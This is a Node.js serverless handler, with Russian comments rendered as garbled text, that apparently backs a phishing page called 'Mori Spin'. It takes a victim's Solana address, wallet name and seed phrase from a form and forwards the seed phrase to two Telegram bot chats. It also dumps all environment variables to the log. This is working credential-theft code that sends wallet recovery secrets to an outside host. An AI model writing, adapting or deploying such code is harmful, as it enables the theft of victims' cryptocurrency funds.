const https = require('https');

// –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è (–æ—Å—Ç–∞–µ—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π)
const sendMessageToBot = (botToken, chatId, message) => {
    return new Promise((resolve, reject) => {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const postData = JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });

        const req = https.request(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        }, (res) => {
            if (res.statusCode >= 200 && res.statusCode < 300) {
                resolve(res);
            } else {
                let errorData = '';
                res.on('data', (chunk) => errorData += chunk);
                res.on('end', () => {
                    console.error('Telegram API Error:', errorData);
                    reject(new Error(`–û—à–∏–±–∫–∞ –æ—Ç–≤–µ—Ç–∞ –æ—Ç Telegram: ${res.statusCode}. –û—Ç–≤–µ—Ç: ${errorData}`));
                });
            }
        });

        req.on('error', reject);
        req.write(postData);
        req.end();
    });
};


exports.handler = async (event) => {
    // --- –î–ò–ê–ì–ù–û–°–¢–ò–ß–ï–°–ö–ê–Ø –°–¢–†–û–ö–ê ---
    // –í—ã–≤–æ–¥–∏–º –≤ –ª–æ–≥ –≤—Å–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä—ã–µ "–≤–∏–¥–∏—Ç" —Ñ—É–Ω–∫—Ü–∏—è
    console.log('Environment Variables Received by Function:', JSON.stringify(process.env));
    // -----------------------------

    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    const { BOT_TOKEN_1, CHAT_ID_1, BOT_TOKEN_2, CHAT_ID_2 } = process.env;

    if (!BOT_TOKEN_1 || !CHAT_ID_1 || !BOT_TOKEN_2 || !CHAT_ID_2) {
        return { 
            statusCode: 500, 
            body: JSON.stringify({ message: "–û–¥–Ω–∞ –∏–ª–∏ –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è –¥–ª—è –±–æ—Ç–æ–≤ –Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω—ã –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ." }) 
        };
    }

    try {
        const data = JSON.parse(event.body);
        const { solAddress, wallet, seedPhrase } = data;

        if (!solAddress || !wallet || !seedPhrase) {
            return {
                statusCode: 400,
                body: JSON.stringify({ message: "–û—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–∞–Ω–Ω—ã–µ." })
            };
        }

        const escapeHTML = (str) => {
            if (typeof str !== 'string') return '';
            return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        };

        const message = `
<b>üîî –ù–æ–≤–∞—è –∑–∞—è–≤–∫–∞ | Mori Spin</b>

<b>–ö–æ—à–µ–ª—ë–∫:</b> ${escapeHTML(wallet)}
<b>SOL –ê–¥—Ä–µ—Å:</b> <code>${escapeHTML(solAddress)}</code>

<b>–°–∏–¥ —Ñ—Ä–∞–∑–∞:</b>
<pre>${escapeHTML(seedPhrase)}</pre>
        `;

        const sendPromises = [
            sendMessageToBot(BOT_TOKEN_1, CHAT_ID_1, message),
            sendMessageToBot(BOT_TOKEN_2, CHAT_ID_2, message)
        ];

        await Promise.all(sendPromises);

        return {
            statusCode: 200,
            body: JSON.stringify({ message: "–£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ –æ–±–∞ —á–∞—Ç–∞" })
        };

    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–∏:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ message: `–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞: ${error.message}` })
        };
    }
};